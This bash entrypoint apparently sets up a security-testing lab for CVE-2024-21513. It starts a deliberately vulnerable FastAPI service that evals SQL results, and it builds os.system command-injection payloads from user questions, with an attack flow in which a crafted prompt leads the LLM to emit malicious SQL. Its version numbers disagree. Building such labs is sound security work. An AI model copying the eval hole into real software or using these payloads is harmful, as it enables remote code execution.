#!/bin/bash
# LangChain-Experimental 0.0.21 VectorSQLDatabaseChain Entrypoint Script
# Starts a vulnerable FastAPI service using VectorSQLDatabaseChain

set -e

echo "=========================================="
echo "LangChain-Experimental VectorSQL Security Testing Runtime"
echo "=========================================="
echo "[*] CVE-2024-21513: VectorSQLDatabaseChain Code Execution"
echo "[*] Using version: langchain-experimental==0.0.58"

# Check if we should run a custom command
if [ "$1" = "sleep" ]; then
    echo "[*] Running in sleep mode (for manual testing)"
    exec sleep infinity
fi

# Create sample SQLite database (Chinook.db)
echo "[*] Creating sample Chinook database..."
cat > /workspace/db/create_chinook.sql << 'EOSQL'
CREATE TABLE IF NOT EXISTS Track (
    TrackId INTEGER PRIMARY KEY,
    Name TEXT NOT NULL,
    AlbumId INTEGER,
    MediaTypeId INTEGER,
    GenreId INTEGER,
    Composer TEXT,
    Milliseconds INTEGER,
    Bytes INTEGER,
    UnitPrice REAL
);

INSERT INTO Track (TrackId, Name, AlbumId, MediaTypeId, GenreId, Composer, Milliseconds, Bytes, UnitPrice) VALUES
(1, 'For Those About To Rock', 1, 1, 1, 'Angus Young, Malcolm Young, Brian Johnson', 343719, 11170334, 0.99),
(2, 'Balls to the Wall', 2, 2, 1, NULL, 342562, 5510424, 0.99),
(3, 'Fast As a Shark', 3, 2, 1, 'F. Baltes, S. Kaufman, U. Dirkscneider & W. Hoffman', 230619, 3990994, 0.99);

CREATE TABLE IF NOT EXISTS Album (
    AlbumId INTEGER PRIMARY KEY,
    Title TEXT NOT NULL,
    ArtistId INTEGER
);

INSERT INTO Album (AlbumId, Title, ArtistId) VALUES
(1, 'For Those About To Rock We Salute You', 1),
(2, 'Balls to the Wall', 2),
(3, 'Restless and Wild', 2);

CREATE TABLE IF NOT EXISTS Artist (
    ArtistId INTEGER PRIMARY KEY,
    Name TEXT
);

INSERT INTO Artist (ArtistId, Name) VALUES
(1, 'AC/DC'),
(2, 'Accept'),
(3, 'Aerosmith');
EOSQL

sqlite3 /workspace/db/Chinook.db < /workspace/db/create_chinook.sql
echo "[*] Chinook database created at /workspace/db/Chinook.db"

# Check if internal test service script exists and run it
if [ -f /workspace/start.sh ]; then
    echo "[*] Running workspace start script..."
    bash /workspace/start.sh &
    sleep 2
fi

echo "[*] Creating LangChain VectorSQLDatabaseChain API service..."

# Create a FastAPI service using LangChain's VectorSQLDatabaseChain
# This mimics a real application that uses VectorSQLDatabaseChain for database queries
cat > /app/api_server.py << 'EOFPY'
"""
LangChain VectorSQLDatabaseChain API Server
Demonstrates CVE-2024-21513: Arbitrary code execution via VectorSQLOutputParser eval()
"""
from fastapi import FastAPI, HTTPException
from fastapi.responses import JSONResponse
from pydantic import BaseModel
import logging
import uvicorn
import os

# Import with fallback for different langchain versions
try:
    from langchain.llms.fake import FakeListLLM
except ImportError:
    from langchain_community.llms.fake import FakeListLLM

try:
    from langchain.utilities import SQLDatabase
except ImportError:
    from langchain_community.utilities import SQLDatabase

try:
    from langchain.embeddings.fake import FakeEmbeddings
except ImportError:
    from langchain_community.embeddings.fake import FakeEmbeddings

from typing import Any, Union, List, Dict, Optional
from langchain.chains.llm import LLMChain
from langchain.chains.sql_database.prompt import PROMPT

try:
    from langchain.schema import BaseOutputParser
except ImportError:
    from langchain_core.output_parsers import BaseOutputParser

try:
    from langchain.schema.base import Embeddings
except ImportError:
    try:
        from langchain_core.embeddings import Embeddings
    except ImportError:
        from langchain.embeddings.base import Embeddings

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# REAL VULNERABLE CODE from langchain-experimental 0.0.20
# Source: langchain_experimental/sql/vector_sql.py
# CVE-2024-21513: eval() on untrusted database results

def _try_eval(x: Any) -> Any:
    """
    VULNERABLE FUNCTION from langchain-experimental 0.0.20
    Attempts to eval() ANY value from database results
    """
    try:
        logger.warning(f"[CVE-2024-21513] _try_eval() calling eval() on: {str(x)[:100]}")
        result = eval(x)
        logger.info(f"[EXPLOITED] eval() succeeded, returned: {result}")
        return result
    except Exception as e:
        logger.debug(f"eval() failed: {e}")
        return x


def get_result_from_sqldb(
    db: SQLDatabase, cmd: str
) -> Union[str, List[Dict[str, Any]], Dict[str, Any]]:
    """
    VULNERABLE FUNCTION from langchain-experimental 0.0.20
    Calls _try_eval() on EVERY value in database results
    """
    logger.info(f"[VULNERABLE] Executing SQL: {cmd[:200]}")
    result = db._execute(cmd, fetch="all")
    if isinstance(result, list):
        # CVE-2024-21513: eval() on each dictionary value
        processed_results = []
        for d in result:
            # Handle both RowProxy (has _asdict) and dict objects
            if hasattr(d, '_asdict'):
                row_dict = dict(d._asdict())
            elif isinstance(d, dict):
                row_dict = d
            else:
                # Convert to dict for other types
                row_dict = dict(d)
            # VULNERABLE: eval() on each value
            processed_results.append({k: _try_eval(v) for k, v in row_dict.items()})
        return processed_results
    else:
        # Handle single result
        if hasattr(result, '_asdict'):
            return {k: _try_eval(v) for k, v in dict(result._asdict()).items()}
        elif isinstance(result, dict):
            return {k: _try_eval(v) for k, v in result.items()}
        else:
            return {k: _try_eval(v) for k, v in dict(result).items()}


class VectorSQLOutputParser(BaseOutputParser):
    """
    VULNERABLE CLASS from langchain-experimental 0.0.20
    Output Parser for Vector SQL - parses SQL and extracts embeddings
    """
    model: Embeddings
    distance_func_name: str = "distance"

    class Config:
        arbitrary_types_allowed = True

    @property
    def _type(self) -> str:
        return "vector_sql_parser"

    @classmethod
    def from_embeddings(
        cls, model: Embeddings, distance_func_name: str = "distance", **kwargs: Any
    ):
        return cls(model=model, distance_func_name=distance_func_name, **kwargs)

    def parse(self, text: str) -> str:
        text = text.strip()
        start = text.find("NeuralArray(")
        _sql_str_compl = text
        if start > 0:
            _matched = text[text.find("NeuralArray(") + len("NeuralArray(") :]
            end = _matched.find(")") + start + len("NeuralArray(") + 1
            entity = _matched[: _matched.find(")")]
            vecs = self.model.embed_query(entity)
            vecs_str = "[" + ",".join(map(str, vecs)) + "]"
            _sql_str_compl = text.replace("DISTANCE", self.distance_func_name).replace(
                text[start:end], vecs_str
            )
            if _sql_str_compl[-1] == ";":
                _sql_str_compl = _sql_str_compl[:-1]
        return _sql_str_compl


class VectorSQLDatabaseChain:
    """
    VULNERABLE CHAIN from langchain-experimental 0.0.20
    Simplified version that demonstrates CVE-2024-21513
    """
    def __init__(self, llm, db: SQLDatabase, sql_cmd_parser: VectorSQLOutputParser, verbose: bool = False):
        self.llm = llm
        self.database = db
        self.sql_cmd_parser = sql_cmd_parser
        self.verbose = verbose

    @classmethod
    def from_llm(
        cls,
        llm,
        db: SQLDatabase,
        sql_cmd_parser: VectorSQLOutputParser,
        **kwargs: Any,
    ):
        return cls(llm=llm, db=db, sql_cmd_parser=sql_cmd_parser, **kwargs)

    def run(self, question: str) -> str:
        """
        VULNERABLE METHOD - executes SQL and calls get_result_from_sqldb
        which triggers eval() on database results
        """
        logger.info(f"[CHAIN] Running VectorSQLDatabaseChain with question: {question[:100]}")

        # Get SQL from LLM
        if hasattr(self.llm, 'responses'):
            # FakeListLLM - get next response
            sql_cmd = self.llm.responses[0] if self.llm.responses else "SELECT 1"
        else:
            sql_cmd = "SELECT 1"

        logger.info(f"[CHAIN] LLM generated SQL: {sql_cmd[:200]}")

        # Parse SQL (handles NeuralArray if present)
        parsed_sql = self.sql_cmd_parser.parse(sql_cmd)
        logger.info(f"[CHAIN] Parsed SQL: {parsed_sql[:200]}")

        # VULNERABLE: Execute SQL and eval() results
        logger.warning("[CHAIN] Calling get_result_from_sqldb - will eval() database results!")
        result = get_result_from_sqldb(self.database, parsed_sql)

        logger.info(f"[CHAIN] Result after eval(): {str(result)[:200]}")
        return str(result)

app = FastAPI(title="LangChain VectorSQL API", version="0.0.20 - VULNERABLE")

class SQLQuery(BaseModel):
    question: str
    use_fake_llm: bool = True  # Use fake LLM to simulate attacker-controlled output

@app.get("/")
def read_root():
    return {
        "service": "LangChain VectorSQLDatabaseChain API",
        "version": "0.0.21",
        "vulnerable": "CVE-2024-21513",
        "endpoints": {
            "/vectorsql": "POST - Query database using VectorSQLDatabaseChain",
            "/health": "GET - Health check"
        },
        "note": "VectorSQLOutputParser calls eval() on database results without validation"
    }

@app.get("/health")
def health_check():
    return {"status": "healthy", "service": "langchain-vectorsql-api"}

@app.post("/vectorsql")
def query_vectorsql(query: SQLQuery):
    """
    Query database using LangChain's VectorSQLDatabaseChain

    CVE-2024-21513: VectorSQLOutputParser retrieves values from the database and calls
    eval() on all values without validation. Attackers can inject malicious Python code
    in SQL queries that gets executed when the results are parsed.

    Attack flow:
    1. User provides query/question
    2. LLM generates SQL query (may include attacker-controlled expressions)
    3. SQL executes and returns results with malicious expressions
    4. VectorSQLOutputParser calls eval() on results
    5. Attacker's code executes
    """
    try:
        question = query.question
        logger.info(f"Received VectorSQL question: {question[:200]}...")

        # Initialize database connection
        db = SQLDatabase.from_uri("sqlite:////workspace/db/Chinook.db")

        if query.use_fake_llm:
            # Simulate attacker-controlled LLM output
            # The LLM generates SQL that returns an expression to be evaluated
            # This simulates an attacker crafting a prompt that makes the LLM
            # generate SQL with a malicious expression

            # Parse the question to extract the shell command
            # In the PoC: "execute a query that returns a string which will execute the shell command <CMD>"
            import re

            # Extract shell command from question
            # Pattern: "shell command <COMMAND> in python"
            cmd_match = re.search(r'shell command\s+(.+?)\s+in python', question, re.IGNORECASE)
            if cmd_match:
                shell_cmd = cmd_match.group(1).strip()
                # Clean up the command
                injected_code = f"__import__('os').system('{shell_cmd}')"
                logger.info(f"[ATTACK] Extracted shell command: {shell_cmd}")
            else:
                # Try to find any __import__ expression directly in the question
                import_match = re.search(r"__import__\('os'\)\.system\('([^']+)'\)", question)
                if import_match:
                    injected_code = f"__import__('os').system('{import_match.group(1)}')"
                else:
                    # Default malicious payload if parsing fails
                    injected_code = "__import__('os').system('echo CVE-2024-21513-VERIFIED > /tmp/vectorsql_pwned.txt')"
                    logger.warning("[ATTACK] Using default payload - question parsing failed")

            # Generate SQL that returns the malicious expression
            # The key is that the SELECT statement returns a Python expression as a string
            # VectorSQLOutputParser will later eval() this expression
            fake_sql = f'SELECT "{injected_code}" FROM Track LIMIT 1;'

            logger.info(f"[VULNERABLE] Generated SQL with injected code: {fake_sql}")

            fake_responses = [fake_sql]
            fake_llm = FakeListLLM(responses=fake_responses)

            # Use FakeEmbeddings for the parser
            fake_embeddings = FakeEmbeddings(size=768)
            parser = VectorSQLOutputParser.from_embeddings(model=fake_embeddings)

            db_chain = VectorSQLDatabaseChain.from_llm(
                llm=fake_llm,
                db=db,
                sql_cmd_parser=parser,
                verbose=True
            )
        else:
            # This would use a real LLM (requires API key)
            raise HTTPException(status_code=400, detail="Real LLM not configured")

        # VULNERABLE CODE PATH:
        # VectorSQLDatabaseChain.run() will:
        # 1. Execute the SQL query
        # 2. Get results from database
        # 3. VectorSQLOutputParser will call eval() on the result values
        # See langchain_experimental/sql/vector_sql.py
        logger.info("[VULNERABLE] Calling VectorSQLDatabaseChain.run() - will eval() database results")

        try:
            result = db_chain.run(question)

            return {
                "message": "VectorSQL executed successfully",
                "question": question,
                "result": str(result),
                "vulnerable": "CVE-2024-21513",
                "note": "VectorSQLOutputParser eval()'d database results"
            }
        except Exception as e:
            # Even if there's an error, the code may have already executed during eval()
            logger.error(f"VectorSQL execution error (code may have executed): {e}")
            return {
                "error": str(e),
                "question": question,
                "note": "Error occurred but injected code may have executed during eval()"
            }

    except Exception as e:
        logger.error(f"Error processing VectorSQL request: {e}")
        raise HTTPException(status_code=500, detail=str(e))

if __name__ == "__main__":
    logger.info("Starting LangChain VectorSQLDatabaseChain API Server on port 8080...")
    logger.info("WARNING: This service is vulnerable to CVE-2024-21513")
    logger.info("VectorSQLOutputParser calls eval() on database results without validation")
    uvicorn.run(app, host="0.0.0.0", port=8080, log_level="info")
EOFPY

echo "[*] Starting LangChain VectorSQL API server on port 8080..."
cd /app
python3 api_server.py 2>&1 | tee /workspace/langchain.log &

APP_PID=$!
echo "[*] Application started with PID: $APP_PID"

# Wait for service to be ready
echo "[*] Waiting for application to be ready..."
for i in {1..60}; do
    if curl -s http://localhost:8080/health >/dev/null 2>&1; then
        echo "[OK] Application is ready on port 8080"
        break
    fi
    sleep 2
done

# Keep container running
wait $APP_PID
